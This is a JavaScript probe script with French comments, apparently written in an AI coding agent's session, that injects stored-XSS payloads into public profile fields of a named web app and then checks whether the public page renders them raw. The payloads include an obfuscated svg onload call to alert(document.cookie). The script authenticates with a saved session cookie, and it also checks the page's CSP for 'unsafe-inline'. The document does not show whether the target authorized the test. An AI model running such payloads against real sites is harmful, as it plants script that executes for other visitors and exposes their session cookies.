// CYBERAAR : XSS stocke sur une page PUBLIQUE (profil / leaderboard)
// 1) on injecte le payload dans les champs affiches publiquement (display_name, country, handle)
// 2) on relit la page publique + l'API : le contenu est-il ECHAPPE ou RENDU BRUT ?
// 3) on releve la CSP de la page publique (un script inline y est-il autorise ?)
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const COOKIE = fs.readFileSync("/tmp/opencode/cyberaar/session-cookie.txt", "utf8").trim();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const H = { "Content-Type": "application/json", Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE };
async function req(path, o = {}) {
  for (let i = 0; i < 3; i++) {
    try {
      const t0 = Date.now();
      const r = await fetch(APP + path, { method: o.m || "GET", headers: o.m ? H : { Accept: "application/json", "User-Agent": UA, Origin: APP, Cookie: COOKIE }, body: o.body, redirect: "manual", signal: AbortSignal.timeout(25000) });
      const t = await r.text();
      return { s: r.status, ms: Date.now() - t0, txt: t, h: Object.fromEntries(r.headers) };
    } catch (e) { await sleep(2500); }
  }
  return { s: 0, ms: 0, txt: "ERR", h: {} };
}
const PAYLOADS = {
  "payload linkedin (decode)": "<!--><svg onload='top[/al/.source+/ert/.source](document.cookie)'>",
  "variante balise fermante": "</textarea><svg onload=alert(1)>",
  "variante sans balise fermante": "<svg onload=alert(1)>",
};
const clean = (s) => s.replace(/<script[\s\S]*?<\/script>/gi, " ").replace(/<style[\s\S]*?<\/style>/gi, " ").replace(/<[^>]+>/g, " ").replace(/\s+/g, " ");

console.log("=== 1) injection dans display_name (champ affiche publiquement) ===");
for (const [lbl, p] of Object.entries(PAYLOADS)) {
  const r = await req("/api/aarme/account/profile", { m: "PATCH", body: JSON.stringify({ display_name: p }) });
  console.log("  " + lbl.padEnd(30) + "PATCH -> HTTP " + r.s + " " + r.txt.replace(/\s+/g, " ").slice(0, 90));
  await sleep(1800);
}
console.log("\n  --- injection dans country (champ texte libre, affiche aussi) ---");
const c2 = await req("/api/aarme/account/profile", { m: "PATCH", body: JSON.stringify({ country: "BJ<!--><svg onload='top[/al/.source+/ert/.source](document.cookie)'>" }) });
console.log("  PATCH country -> HTTP " + c2.s + " " + c2.txt.replace(/\s+/g, " ").slice(0, 90));
await sleep(1800);

console.log("\n=== 2) ce que renvoie l API (le nom est-il brut ?) ===");
const me = await req("/api/aarme/account/me");
const name = (me.txt.match(/"display_name":"([^"]*)"/) || [, ""])[1];
const country = (me.txt.match(/"country":"([^"]*)"/) || [, ""])[1];
console.log("  /account/me  display_name = " + JSON.stringify(name));
console.log("  /account/me  country      = " + JSON.stringify(country));
const lb = await req("/api/aarme/leaderboard");
console.log("  /leaderboard contient-il la charge utile en clair ? " + (lb.txt.includes("onload") ? "OUI (BRUT)" : "non"));
const lbName = (lb.txt.match(/"name":"([^"]*)"/) || [, ""])[1];
console.log("  /leaderboard name = " + JSON.stringify(lbName));

console.log("\n=== 3) la page PUBLIQUE : brut ou echappe ? + CSP ===");
const handle = (me.txt.match(/"handle":"([^"]*)"/) || [, ""])[1];
console.log("  handle = " + (handle || "(vide)"));
if (handle) {
  const pub = await req("/h/" + handle);
  const raw = pub.txt.includes("onload") && !pub.txt.includes("&lt;svg");
  const esc = pub.txt.includes("&lt;svg") || pub.txt.includes("&lt;!--&gt;");
  console.log("  page publique HTTP " + pub.s + " | " + pub.txt.length + " car.");
  console.log("  charge utile presente BRUTE dans le HTML ? " + (raw ? "OUI -> XSS POTENTIELLE" : "non"));
  console.log("  charge utile presente ECHAPPEE (&lt;svg) ? " + (esc ? "oui (echappement correct)" : "non"));
  const idx = pub.txt.indexOf("onload");
  if (idx > 0) console.log("  extrait brut : " + pub.txt.slice(Math.max(0, idx - 200), idx + 220).replace(/\s+/g, " "));
  const csp = pub.h["content-security-policy"] || "(aucune)";
  console.log("  CSP : " + csp.slice(0, 260));
  console.log("  -> script inline autorise ? " + (/script-src[^;]*'unsafe-inline'/.test(csp) ? "OUI" : "NON (bloque)"));
  console.log("  texte visible (nettoye) : " + clean(pub.txt).slice(0, 400));
}
fs.writeFileSync("/tmp/opencode/cyberaar/xss-probe.json", JSON.stringify({ me: me.txt.slice(0, 1200), leaderboard: lb.txt.slice(0, 1200) }, null, 1));
